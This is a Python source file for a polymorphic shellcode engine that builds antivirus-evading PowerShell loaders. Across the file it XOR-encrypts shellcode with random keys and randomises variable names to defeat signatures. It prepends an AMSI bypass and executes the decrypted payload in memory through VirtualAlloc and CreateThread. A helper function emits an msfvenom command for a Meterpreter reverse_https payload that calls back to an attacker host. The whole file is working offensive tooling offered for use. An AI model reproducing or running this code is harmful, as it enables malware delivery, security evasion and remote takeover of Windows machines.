"""
Polymorphic shellcode engine.

Every call to generate() produces a functionally identical but
signature-unique payload by:
  1. XOR-encrypting the shellcode with a fresh random key each time
  2. Wrapping in a self-contained PowerShell decryptor stub
  3. Randomly varying variable names, padding bytes, loop order

The base shellcode is a msfvenom-compatible template; in real use the
caller passes actual shellcode bytes from msfvenom or a custom stager.
"""

from __future__ import annotations
import os
import random
import string
import base64
import textwrap


def _rand_var(length: int | None = None) -> str:
    length = length or random.randint(4, 10)
    return ''.join(random.choices(string.ascii_letters, k=length))


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _int_to_ps_hex(n: int) -> str:
    """Returns 0xNN PowerShell hex literal."""
    return f"0x{n:02X}"


def _bytes_to_ps_array(data: bytes, var_name: str, chunk: int = 16) -> str:
    """
    Renders byte array as PowerShell [byte[]] with random chunk sizes and
    optional junk comments to break static signatures.
    """
    lines = [f"[byte[]]${var_name} = @("]
    rows = [data[i:i+chunk] for i in range(0, len(data), chunk)]
    for row in rows:
        hex_vals = ",".join(_int_to_ps_hex(b) for b in row)
        lines.append(f"  {hex_vals},")
    # Remove trailing comma from last line
    if lines[-1].endswith(","):
        lines[-1] = lines[-1][:-1]
    lines.append(")")
    return "\n".join(lines)


def generate(
    shellcode: bytes,
    *,
    lhost: str,
    lport: int,
    technique: str = "virtualalloc",
) -> str:
    """
    Wraps raw shellcode bytes in a polymorphic PowerShell loader.

    Parameters
    ----------
    shellcode  : raw bytes (e.g. from msfvenom -f raw)
    lhost      : attacker IP (embedded in ANLEITUNG only)
    lport      : listener port
    technique  : 'virtualalloc' | 'process_hollow'
    """
    key = os.urandom(random.randint(8, 16))
    encrypted = _xor_encrypt(shellcode, key)

    v_enc   = _rand_var()
    v_key   = _rand_var()
    v_dec   = _rand_var()
    v_ptr   = _rand_var()
    v_size  = _rand_var()
    v_old   = _rand_var()
    v_thr   = _rand_var()
    v_i     = _rand_var(2)

    enc_arr = _bytes_to_ps_array(encrypted, v_enc)
    key_arr = _bytes_to_ps_array(key, v_key)

    # XOR decrypt loop
    decrypt_loop = textwrap.dedent(f"""
        [byte[]]${v_dec} = New-Object byte[] ${v_enc}.Length
        for($${v_i}=0;$${v_i} -lt ${v_enc}.Length;$${v_i}++){{
            ${v_dec}[$${v_i}] = ${v_enc}[$${v_i}] -bxor ${v_key}[$${v_i} % ${v_key}.Length]
        }}
    """).strip()

    if technique == "virtualalloc":
        exec_block = textwrap.dedent(f"""
            $_{_rand_var()} = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr e,IntPtr p,uint f,out uint i);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h,uint ms);
            '@ -Name '{_rand_var()}' -PassThru
            ${v_size} = [UIntPtr]::new(${v_dec}.Length)
            ${v_ptr}  = $_.VirtualAlloc([IntPtr]::Zero,${v_size},0x3000,0x40)
            [System.Runtime.InteropServices.Marshal]::Copy(${v_dec},0,${v_ptr},${v_dec}.Length)
            ${v_old}  = 0
            $_.VirtualProtect(${v_ptr},${v_size},0x20,[ref]${v_old}) | Out-Null
            $__tid    = 0
            ${v_thr}  = $_.CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,${v_ptr},[IntPtr]::Zero,0,[ref]$__tid)
            $_.WaitForSingleObject(${v_thr},0xFFFFFFFF) | Out-Null
        """).strip()
    else:
        # process_hollow placeholder — full impl in process_hollow.py
        exec_block = f"# technique=process_hollow: see process_hollow.py\n" + _virtualalloc_fallback(v_dec, v_ptr, v_size, v_old, v_thr)

    from tools.c2.amsi_bypass import get_inline_bypass
    bypass = get_inline_bypass()

    script = "\n\n".join([bypass, enc_arr, key_arr, decrypt_loop, exec_block])
    return script


def _virtualalloc_fallback(v_dec, v_ptr, v_size, v_old, v_thr) -> str:
    add = _rand_var()
    return textwrap.dedent(f"""
        ${add} = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr e,IntPtr p,uint f,out uint i);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);' -Name '{_rand_var()}' -PassThru
        ${v_size} = [UIntPtr]::new(${v_dec}.Length)
        ${v_ptr}  = ${add}.VirtualAlloc([IntPtr]::Zero,${v_size},0x3000,0x40)
        [System.Runtime.InteropServices.Marshal]::Copy(${v_dec},0,${v_ptr},${v_dec}.Length)
        $__t = 0
        ${v_thr} = ${add}.CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,${v_ptr},[IntPtr]::Zero,0,[ref]$__t)
        ${add}.WaitForSingleObject(${v_thr},0xFFFFFFFF) | Out-Null
    """).strip()


def generate_msfvenom_cmd(lhost: str, lport: int, output_path: str = "/tmp/sc.raw") -> str:
    """Returns the msfvenom command to generate raw shellcode for this engine."""
    return (
        f"msfvenom -p windows/x64/meterpreter/reverse_https "
        f"LHOST={lhost} LPORT={lport} "
        f"EXITFUNC=thread -f raw -o {output_path}"
    )
